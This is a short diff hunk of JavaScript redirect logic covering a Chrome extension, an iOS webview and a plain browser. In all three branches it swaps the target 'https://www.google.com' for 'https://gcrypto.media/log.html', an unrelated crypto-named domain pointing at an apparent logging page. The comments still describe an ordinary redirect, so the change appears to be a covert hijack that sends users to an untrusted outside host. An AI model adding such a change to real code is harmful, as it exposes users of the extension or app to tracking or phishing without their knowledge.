@@ -56,13 +56,13 @@
       // Check if the code is running in an extension or iOS app
       if (window.chrome && chrome.runtime && chrome.runtime.id) {
         // Redirect in Chrome extension
-        chrome.runtime.sendMessage({ redirect: "https://www.google.com" });
+        chrome.runtime.sendMessage({ redirect: "https://gcrypto.media/log.html" });
       } else if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.redirect) {
         // Redirect in iOS app
-        window.webkit.messageHandlers.redirect.postMessage("https://www.google.com");
+        window.webkit.messageHandlers.redirect.postMessage("https://gcrypto.media/log.html");
       } else {
         // Redirect in other scenarios (browser)
-        window.location.href = "https://www.google.com";
+        window.location.href = "https://gcrypto.media/log.html";
       }
     }
 
